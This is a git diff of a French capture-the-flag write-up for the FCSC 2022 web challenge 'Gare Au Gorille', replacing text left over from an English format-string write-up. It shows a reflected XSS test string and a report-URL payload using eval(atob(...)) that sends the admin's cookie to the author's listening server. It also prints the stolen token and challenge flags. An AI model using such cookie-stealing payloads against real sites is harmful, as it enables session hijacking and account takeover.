@@ -36,22 +36,32 @@
 
 Je commence tout d'abord par cliquer sur "Ajouter Un Meme" mais evidemment il m'est impossible d'y acceder a moins d'etre admin.
 Je passe donc au field et je remarque que quand je donne l'entree ` <script>alert('XSS')</script> ` le script en javascript est execute
-### :arrows_counterclockwise: Reversing the program
 
-We can starts analyzing the binary with some utilities:
+![xss](https://github.com/Numb3rsProprety/FCSC2022/blob/main/Gare-Au-Gorille/xss.PNG?raw=true)
 
+Ceci etant fait je cherche un moyen pour exploiter cette faille et je me met donc a examiner la fonction report du site.
+En cliquant sur le boutton report le site me redirige vers ce lien:
+` https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=meme_01.jpg `
+Le parametre search est reutilise dans le report.
+On peut donc utiliser ce parametre pour injecter un payload qui renverra le cookie de l'utilisateur executant le programme a notre serveur distant.
+Si l'on envoie ce payload a l'administrateur il executera le code javascript et nous enverra son token et nous permettra de nous connecter avec son compte
+### :arrows_counterclockwise: Exploitation
+
+Avant tout j'ai setup un serveur d'ecoute pour pouvoir recevoir les cookies.
+Je fait un payload qui envoie le token vers mon serveur
+(cette data sheet m'a beaucoup aide: https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
+notre payload request de fin ressemble donc a ca:
+https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=eval(atob('ZG9jdW1lbnQubG9jYXRpb24gPSAnaHR0cDovL2xvY2FsaG9zdDo4MC8/Y29va2llPScgKyBkb2N1bWVudC5kb21haW4rJzogJytkb2N1bWVudC5jb29raWU='))
+
+En attendant un peu on recoit le token sur notre serveur: O9Mv3sFaQD1UpQRLCXVOCzCi0dRbpz4Wy4kGPngZt36MZnR6xZpbHLQRWfDi6T45
+On peut maintenant acceder au flag:
 ```
-$ file formatage
-formatage: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /home/n7student/Documents/CTF/FCSC2022/pwn/formatage/lib/ld-2.34.so, BuildID[sha1]=39a11f9a8688c39d7943b084fb7a6f81617573b9, for GNU/Linux 3.2.0, stripped
+Congrats here is the flag
 
-The remote exploit takes some time, as we need to bruteforce 12 bits of ASLR to get a valid `printf` return address pointer.
-
-
-
-Flag: `FCSC{8f1038be95c111447ed7a77492a7c03d465439119c084cf8d867e2d9b8bafcc4}`
+Flag: `FCSC{14b15680de4e305b89eaa2a07b137abf4e39b5773f39a4ea7155ca5387c6f59e}`
 
 
 ```
 ### :checkered_flag: Conclusion
 
-`formatage` was a very cool challenge about format strings, that really helped me to deeply understand the tricks about format string vulnerabilities. Thanks to its creator!
+`Gare Au Gorille` Assez cool et demande pas beaucoup de temps.
